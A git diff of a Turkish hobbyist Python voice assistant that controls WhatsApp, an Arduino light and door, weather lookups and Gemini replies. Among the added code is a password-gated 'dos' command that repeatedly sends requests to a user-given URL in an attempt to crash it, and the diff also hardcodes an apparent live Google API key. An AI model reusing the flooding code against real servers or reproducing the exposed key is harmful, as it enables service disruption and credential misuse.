@@ -1,314 +1,324 @@
+import winsound
 from gtts import gTTS
-import os 
-import pyautogui
-import time
+import json
 import speech_recognition as sr
-mesaj2="birşey söyle"
-mesaj = "lütfen bekleyin mikrofon kalibre ediliyor"
-dil = "tr"
-mesaj3="sanırım şunu söylediniz" 
-mesaj4="google ne söylediğinizi algılayamadı" 
+import pywhatkit
+import pyautogui
+import webbrowser
+import time
+import serial
+import requests
+import pygame
+from datetime import datetime
+from google import genai
+from translate import Translator
+ser = serial.Serial(port='COM3', baudrate=9600)
+dosya=input("local dizi:")
+# JSON dosyasını okuma ve ses dosyalarını kaydetme
+with open(dosya+"asistan_veri.json", "r") as rdt:
+    dt = json.load(rdt)
+def head(url):
+  f=requests.get(url,{})
+  if f.status_code==200:
+     return "get"
+  elif f.status_code!=200:
+     f1=requests.post(url,{})
+     if f1.status_code==200:
+         return "post"
+     else:
+         f2=requests.put(url,{})
+         if  f2.status_code==200:
+             return "put"
+         else:
+             return "delete"
+def dos(meth,url):
+    match meth:
+        case "get":
+            while True:
+                r=requests.get(url)
+                if r.status_code==500:
+                    print("dos başarılı")
+                    break
+                else:
+                    return
+        case "post":
+            while True:
+                r=requests.post(url)
+                if r.status_code==500:
+                    print("dos başarılı")
+                    break
+                else:
+                    return
+        case "delete":
+            while True:
+                r=requests.delete(url)
+                if r.status_code==500:
+                    print("dos başarılı")
+                    break
+                else:
+                    return
+        case "put":
+            while True:
+                r=requests.put(url)
+                if r.status_code==500:
+                    print("dos başarılı")
+                    break
+                else:
+                    return                
+                    
+sleep=False
+print("""
+####################################################################################################
+####################################################################################################
+############################*-:.........:=*#########################################################
+#########################+:...........:::...-*######################################################
+#######################+........:=*#########*+-+####################################################
+#####################*:.......-*################+###################################################
+####################*........*######################################################################
+###################*.......:##########################==###########################################
+###################-.......*##########################-.:*###+=*##################################
+##################*.......-###########################-......:*###################################
+##################*.......+#######################*:........-#####################################
+##################*.......+#######################**-.......:*####################################
+##################*:......-###########################-...:...+###################################
+###################-.......*##########################-.-#####+*##################################
+####################:.......*#########################=+###########################################
+####################*:.......+######################################################################
+######################-.......:+###############*+###################################################
+#######################*:........-+*########+--*##################################################
+#########################*-.................=#######################################################
+#############################*-.........-*##########################################################
+####################################################################################################
+####################################################################################################
+""")
 
-time.sleep(10)
-pyautogui.moveTo(x=100,y=744)
-time.sleep(1)
-pyautogui.click(button="left",clicks=1)
-time.sleep(1)
-pyautogui.write("w")
-time.sleep(2)
-pyautogui.write("h")
-time.sleep(2)
-pyautogui.write("a")
-time.sleep(2)
-pyautogui.write("t")
-time.sleep(2)
-pyautogui.write("s")
-time.sleep(2)
-pyautogui.write("a")
-time.sleep(2)
-pyautogui.write("p")
-time.sleep(2)
-pyautogui.write("p")
-time.sleep(1)
-pyautogui.press("enter")
-time.sleep(1)
-pyautogui.moveTo(x=463, y=234)
-time.sleep(1)
-pyautogui.click(button="left",clicks=1)
-pyautogui.moveTo(x=803, y=739)
-time.sleep(1)
-pyautogui.moveTo(x=794, y=694)
-time.sleep(1)
-pyautogui.click(button='left', clicks=1)
-time.sleep(1)
-pyautogui.moveTo(x=193, y=189)
-time.sleep(1)
-pyautogui.click(button='left', clicks=1)
-time.sleep(1)
-pyautogui.moveTo(x=581, y=705)
-time.sleep(1)
-# pyautogui.click(button='left', clicks=1)
-# def mesaj():
-#   pyautogui.write("a")
-#   pyautogui.press('enter')
+# İlk işlem kontrolü
+if dt["first"] == "n":
+    with open(dosya+"asistan_veri.json", "w") as rdt:
+        tts1 = gTTS(dosya+"yanlış parola tekrar deneyin", lang='tr')
+        tts1.save("ses1.mp3")
+        tts2 = gTTS(dosya+"parola doğru", lang='tr')
+        tts2.save("ses2.mp3")
+        tts5 = gTTS(dosya+"işlem yapıldı", lang='tr')
+        tts5.save("ses5.mp3")
+        tts3 = gTTS(dosya+"hata oluştu tam çıktı için terminale bakın", lang='tr')
+        tts3.save("ses3.mp3")
+        tts4 = gTTS(dosya+"problem gözükmüyor", lang='tr')
+        tts4.save("ses4.mp3")
+        udt = input("Adınızı, telefon numaranızı (ülke kodu ile) ve şifrenizi boşluk bırakarak giriniz: ")
+        udts = udt.split(" ")
+        dt["first"] = "y"
+        dt["name"] = udts[0]
+        dt["question"]["what is your phone number"] = udts[1]
+        dt["question"]["please make password"] = udts[2]
+        dt["people"][udts[0].lower()] = udts[1]
+        dt["dizi"]=dosya
+        dt["sleep"]=["n","n"]
+        json.dump(dt, rdt, indent=5)
+        print("Kayıt tamamlandı.")
 
-# while True: 
-#   mesaj()
-#   time.sleep(0)
-pyautogui.write("merhaba")
-pyautogui.press('enter')
-time.sleep(1)
-pyautogui.write("naber")
-pyautogui.press('enter')
-time.sleep(1)
-pyautogui.write("ben furkanın botuyum")
+winsound.PlaySound(r'C:\\Windows\\Media\\Windows Logon.wav', winsound.SND_ALIAS)
+with open(dosya+"asistan_veri.json","r") as rdt:
+    dt=json.load(rdt)
+    if dt["sleep"][1]=="n" and dt["sleep"][0]=="n":
+      print("uyku saatlerinizi asistanınızın daha verimli çalışması için ayarlayın")
+    elif dt["sleep"][1]=="n" or dt["sleep"][0]=="n":
+        print("uyku saatleriniz yazılırken hata oluşmuş lütfen yeniden ayarlayın")
+def playsound(s):
+    pygame.mixer.init()  # Pygame mixer başlatılır.
+    pygame.mixer.music.load(s)  # Ses dosyası yüklenir.
+    pygame.mixer.music.play()  # Müzik çalmaya başlar.
+    
+    while pygame.mixer.music.get_busy():  # Müzik çalmaya devam ettiği sürece beklenir.
+        pygame.time.Clock().tick(10)  # CPU kullanımını azaltmak için beklenir.
+    pygame.mixer.music.stop()
+    pygame.quit()
+def check_sleep():
+    global sleep
+    with open(dosya+"asistan_veri.json", "r") as rdt:
+        dt = json.load(rdt)
+        
+    tm = datetime.now()
+    nowt = tm.strftime("%H:%M")
+    
+    q = ""
+    if dt["sleep"][0] == nowt and q=="":
+        q = input("Asistan uyku modunda. Eğer çıkmak istiyorsanız 'q' girin: ")
+        ser.write(b"o")
+        ser.write(b"m")
+        sleep = True
+        ser.close()
 
-pyautogui.press('enter')
-time.sleep(1)
-pyautogui.moveTo(x=1365,y=0)
-time.sleep(4)
+    if q == "q" or dt["sleep"][1] == nowt:
+        if not ser.is_open:  
+            ser.open()
+        ser.write(b"f")
+        ser.write(b"g")
+        sleep=False
+
+       
+def runc(com):
+    coms = com.lower().split()
+
+    if coms[0] == "mesaj":
+        with open(dosya, "r") as rdt:
+            dt = json.load(rdt)
+
+        kisi = coms[1].lower()
+        mesaj = " ".join(coms[2:])
+
+        if kisi in dt["people"]:
+            try:
+                pywhatkit.sendwhatmsg_instantly(dt["people"][kisi], mesaj, wait_time=10, tab_close=True)
+                pyautogui.press('enter')
+                playsound("ses5.wav")
+            except Exception as e:
+                print(f"Mesaj gönderme hatası: {e}")
+                playsound("ses3.wav")
+        else:
+            print(f"Hata: '{kisi}' isimli kişi rehberde yok.")
+
+    elif coms[0] == "marş":
+        playsound(dosya+"onsound.mp3")
+
+    elif coms[0] == "telefon":
+        with open(dosya+"asistan_veri.json", "r") as rdt:
+            dt = json.load(rdt)
+
+        newphone = input("Eklenicek kişinin adı: ").strip().lower()
+        newphone2 = input("Eklenicek kişinin telefon numarası: ").strip()
+
+        dt["people"][newphone] = newphone2
+
+        with open(dosya+"asistan_veri.json", "w") as rdt:
+            json.dump(dt, rdt, indent=4)
+
+        print(f"{newphone} rehbere eklendi.")
+    elif coms[0] == "şarkı":
+        webbrowser.open("https://www.youtube.com/watch?v=Tzi_nl0XKgk&list=RDMM05tpymEcmRU")
+        pyautogui.moveTo(x=1070, y=1820)
+        pyautogui.leftClick()
+    elif coms[0] == "arama":
+        if len(coms) == 2:
+            pyautogui.moveTo(x=200, y=1080)
+            pyautogui.leftClick()
+            time.sleep(1)
+            pyautogui.write('whatsapp')
+            pyautogui.press('enter')
+            time.sleep(2)
+            pyautogui.hotkey('ctrl', 'f')
+            time.sleep(1)
+            pyautogui.write(coms[1])
+            pyautogui.moveTo(x=400, y=250)
+            pyautogui.leftClick()
+            pyautogui.moveTo(x=1470, y=100)
+            pyautogui.leftClick()
+        else:
+            print("arama için kişi adı giriniz")
+    elif coms[0].lower() in ["ışık", "Işık", "işık", "işik"]:
+        if len(coms) > 1:
+            durum = coms[1]
+            if durum in ["aç", "yak"]:
+                print("[SERIAL] -> o (ışık açılıyor)")
+                ser.write(b'o')
+            elif durum in ["kapat", "söndür"]:
+                print("[SERIAL] -> f (ışık kapanıyor)")
+                ser.write(b'f')
+    elif coms[0].lower() == "hava":
+        rdt = requests.get("https://wttr.in/istanbul?format=j2")
+        dt = rdt.json()
+
+        hissedilen = dt["current_condition"][0]["FeelsLikeC"]
+        temp = dt["current_condition"][0]["temp_C"]
+        pres = int(dt["current_condition"][0]["pressure"]) * 0.1
+        maxtemp = dt["weather"][0]["maxtempC"]
+        mintemp = dt["weather"][0]["mintempC"]
+        sunrise = str(dt["weather"][0]["astronomy"][0]["sunrise"])
+        sunset = str(dt["weather"][0]["astronomy"][0]["sunset"])
+        sunsets = sunset.split(":")
+        if "PM" in sunset:
+            sunsets[0] = str(int(sunsets[0]) + 12)
+
+        sunset = ":".join(sunsets)
+
+        tts = gTTS(f"""Hissedilen sıcaklık: {hissedilen}°C
+Sıcaklık: {temp}°C
+Basınç: {pres} kPa
+En yüksek sıcaklık: {maxtemp}°C
+En düşük sıcaklık: {mintemp}°C
+Gün doğumu: {sunrise}
+Gün batımı: {sunset}""", lang='tr', slow=False)
+        tts.save("havadurumu.mp3")
+        playsound("C:\\Users\\Ozkan\\Desktop\\asistan\\havadurumu.mp3")
+    elif coms[0]=="kapı":
+       ser.write(b"b") 
+    elif coms[0]=="uyku":
+        hours=input("lütfen uyku saatlerinizi 24 saat baz alarak virgül ile ayırarak yazınız").split(",")
+        if hours[1] and hours[0]:
+            with open(dosya+"asistan_veri.json","r") as rdt:
+                dt=json.load(rdt)
+            dt["sleep"][0]=hours[0]
+            dt["sleep"][1]=hours[1]
+            with open(dosya+"asistan_veri.json","w") as rdt:
+                 json.dump(dt,rdt,indent=5)
+    elif coms[0]=="dos":
+        with open(dosya+"asistan_veri.json","r") as rdt:
+            dt=json.load(rdt)
+        ps=input("Lütfen şifre giriniz:")
+        if ps==dt["question"]["please make password"]:
+            playsound("ses2.mp3")
+            winsound.MessageBeep(winsound.MB_OK)
+            url=input("url giriniz:")
+            meth=head(url)
+            if meth!="unnkown":
+                    dos(url,meth)
+            else:
+                print("method alınamadı ")
+    else:
+     client = genai.Client(api_key="AIzaSyDIiDar3TE87YWTap1WcftMmfsRnrDPj6Y")
+
+     translator = Translator(to_lang="tr")  
+     en = Translator(to_lang="en")
+
+     inp = com  # komut metni burada
+
+    # Metni 500 karakterlik parçalara böl
+     parcalar = [inp[i:i+500] for i in range(0, len(inp), 500)]
+
+     yanit = ""
+     for i, parca in enumerate(parcalar):
+        print(f"⏩ [Parça {i+1} gönderiliyor]: {parca[:60]}...")
+        ceviri = en.translate(parca)
+        response = client.models.generate_content(
+          model="gemini-2.0-flash",
+          contents=[{"role": "user", "parts": [{"text": ceviri}]}]
+        )
+        yanit += response.text.strip() + " "
+
+    # Türkçeye çevir
+     translated = translator.translate(yanit.strip())
+
+     
+     if "QUERY" not in translated.split(" "):
+    # Sesli oynatma
+      tts = gTTS(translated, lang='tr')
+      tts.save("out.mp3")
+      playsound("out.mp3")
+      print("📢 [Cevap]:", translated)
+      inp = ""
+
+recognizer = sr.Recognizer()
+
 while True:
- r = sr.Recognizer()
- with sr.Microphone() as source:
-    tts = gTTS(text=mesaj, lang=dil, slow=False)
-    tts.save("merhaba.mp3")
-    os.system("merhaba.mp3")
-    time.sleep(8)
-    pyautogui.moveTo(x=1360,y=30)
-    time.sleep(1)
-    pyautogui.click(clicks=1,button='left')
-    # listen for 5 seconds and create the ambient noise energy level
-    r.adjust_for_ambient_noise(source, duration=2)
-    tts = gTTS(text=mesaj2, lang=dil, slow=False)
-    tts.save("merhaba.mp3")
-    os.system("merhaba.mp3")
-    time.sleep(4)
-    pyautogui.moveTo(x=1360,y=0)
-    time.sleep(1)
-    pyautogui.click(clicks=1,button='left')
-    audio = r.listen(source)
-    # ses tanıma yapmak için try bloğunun içine alın
-    try:
-      text = r.recognize_google(audio, language="tr-TR")
-      tts = gTTS(text=mesaj3 + text, lang=dil, slow=False)
-      tts.save("merhaba.mp3")
-      os.system("merhaba.mp3")
-      time.sleep(8)
-      pyautogui.moveTo(x=1360,y=30)
-      time.sleep(1)
-      pyautogui.click(clicks=1,button='left')
-    except sr.UnknownValueError:
-      tts = gTTS(text=mesaj4, lang=dil, slow=False)
-      tts.save("merhaba.mp3")
-      os.system("merhaba.mp3")
-      time.sleep(7)
-      pyautogui.moveTo(x=1360,y=30)
-      time.sleep(1)
-      pyautogui.click(clicks=1,button='left')
-      continue
+    with sr.Microphone() as source:
+        audio = recognizer.listen(source)
 
- if( r.recognize_google(audio)=="Google"):
-  pyautogui.moveTo(x=100,y=744)
-  time.sleep(1)
-  pyautogui.click(button="left",clicks=1)
-  time.sleep(1)
-  pyautogui.write("g")
-  time.sleep(2)
-  pyautogui.write("o")
-  time.sleep(2)
-  pyautogui.write("o")                
-  time.sleep(2)
-  pyautogui.write("g")
-  time.sleep(2)
-  pyautogui.write("l")
-  time.sleep(2)
-  pyautogui.write("e")
-  time.sleep(1)
-  pyautogui.press('enter')
- 
- if( r.recognize_google(audio)=="Sekiz"):
-
-  pyautogui.moveTo(x=100,y=744)
-  time.sleep(1)
-  pyautogui.click(button="left",clicks=1)
-  time.sleep(1)
-  pyautogui.write("a")
-  time.sleep(2)
-  pyautogui.write("s")
-  time.sleep(2)
-  pyautogui.write("p")
-  time.sleep(2)
-  pyautogui.write("h")
-  time.sleep(2)
-  pyautogui.write("a")
-  time.sleep(2)
-  pyautogui.write("l")
-  time.sleep(2)
-  pyautogui.write("t")
-  time.sleep(2)
-  pyautogui.write("8")
-  time.sleep(2)
-  pyautogui.write("A") 
-  time.sleep(2)
-  pyautogui.write("İ")
-  time.sleep(2)
-  pyautogui.write("R")
-  time.sleep(2)
-  pyautogui.write("B")
-  time.sleep(2)
-  pyautogui.write("O")
-  time.sleep(2)
-  pyautogui.write("R")
-  time.sleep(2)
-  pyautogui.write("N")
-  time.sleep(2)
-  pyautogui.write("E") 
-  time.sleep(1)
-  pyautogui.press("enter")
-
- 
- if( r.recognize_google(audio)=="Three"):
-
-  pyautogui.moveTo(x=100,y=744)
-  time.sleep(1)
-  pyautogui.click(button="left",clicks=1)
-  time.sleep(1)
-  pyautogui.write("h")
-  time.sleep(2)
-  pyautogui.write("e")
-  time.sleep(2)
-  pyautogui.write("a")
-  time.sleep(2)
-  pyautogui.write("p")
-  time.sleep(2)
-  pyautogui.write("m")
-  time.sleep(2)
-  pyautogui.write("a")
-  time.sleep(2)
-  pyautogui.write("k")
-  time.sleep(2)
-  pyautogui.write("i")
-  time.sleep(2)
-  pyautogui.write("n")
-  time.sleep(2)
-  pyautogui.write("e")
-  time.sleep(2)
-  pyautogui.write("s")
-  time.sleep(2)
-  pyautogui.write("i")
-  time.sleep(1)
-  pyautogui.press("enter")
-
-  
- if( r.recognize_google(audio)=="Four"):
-
-  pyautogui.moveTo(x=100,y=744)
-  time.sleep(1)
-  pyautogui.click(button="left",clicks=1)
-  time.sleep(1)
-  pyautogui.write("m")
-  time.sleep(2)
-  pyautogui.write("i")
-  time.sleep(2)
-  pyautogui.write("c")
-  time.sleep(2)
-  pyautogui.write("r")
-  time.sleep(2)
-  pyautogui.write("o")
-  time.sleep(2)
-  pyautogui.write("s")
-  time.sleep(2)
-  pyautogui.write("o")
-  time.sleep(2)
-  pyautogui.write("f")
-  time.sleep(2)
-  pyautogui.write("t")
-  time.sleep(1)
-  pyautogui.press("enter")
-
-  
- if( r.recognize_google(audio)=="Five"):
-
-  pyautogui.moveTo(x=100,y=744)
-  time.sleep(1)
-  pyautogui.click(button="left",clicks=1)
-  time.sleep(1)
-  pyautogui.write("g")
-  time.sleep(2)
-  pyautogui.write("ö")
-  time.sleep(2)
-  pyautogui.write("r")
-  time.sleep(2)
-  pyautogui.write("e")
-  time.sleep(2)
-  pyautogui.write("v")
-  time.sleep(2)
-  pyautogui.write("y")
-  time.sleep(2)
-  pyautogui.write("ö")
-  time.sleep(2)
-  pyautogui.write("n")
-  time.sleep(2)
-  pyautogui.write("e")
-  time.sleep(2)
-  pyautogui.write("t")
-  time.sleep(2)
-  pyautogui.write("i")
-  time.sleep(2)
-  pyautogui.write("c")
-  time.sleep(2)
-  pyautogui.write("i")
-  time.sleep(2)
-  pyautogui.write("s")
-  time.sleep(2)
-  pyautogui.write("i")
-  time.sleep(1)
-  pyautogui.press("enter")
-
-  
- if( r.recognize_google(audio)=="Six"):
-
-  pyautogui.moveTo(x=100,y=744)
-  time.sleep(1)
-  pyautogui.click(button="left",clicks=1)
-  time.sleep(1)
-  pyautogui.write("o")
-  time.sleep(2)
-  pyautogui.write("p")
-  time.sleep(2)
-  pyautogui.write("e")
-  time.sleep(2)
-  pyautogui.write("n")
-  time.sleep(2)
-  pyautogui.write("r")
-  time.sleep(2)
-  pyautogui.write("o")
-  time.sleep(2)
-  pyautogui.write("c")
-  time.sleep(2)
-  pyautogui.write("k")
-  time.sleep(2)
-  pyautogui.write("e")
-  time.sleep(2)
-  pyautogui.write("t")
-  time.sleep(1)
-  pyautogui.press("enter")
-
-  
-  pyautogui.click(button='left', clicks=1)
- if(r.recognize_google(audio)!="One", r.recognize_google(audio)!="Two", r.recognize_google(audio)!="Three", r.recognize_google(audio)!="Four", r.recognize_google(audio)!="Five", r.recognize_google(audio)!="Six"):
-   pyautogui.moveTo(x=463, y=734)
-   time.sleep(1)
-   pyautogui.moveTo(x=463, y=724)
-   time.sleep(1)
-   pyautogui.click(button='left',clicks=1)
-   time.sleep(1)
-   pyautogui.moveTo(x=463, y=419)
-   pyautogui.click(button='left',clicks=1)
-   pyautogui.write( r.recognize_google(audio))
-   pyautogui.press('enter')
- time.sleep(0)
-
- 
-
-
+        try:
+            text = recognizer.recognize_google(audio, language='tr-TR')
+            print('Tanınan Metin: ' + text)
+            runc(text)
+        except sr.UnknownValueError:
+            print('Ses anlaşılamadı.')
+        except sr.RequestError as e:
+            print(f'API hatası: {e}')
+        check_sleep()
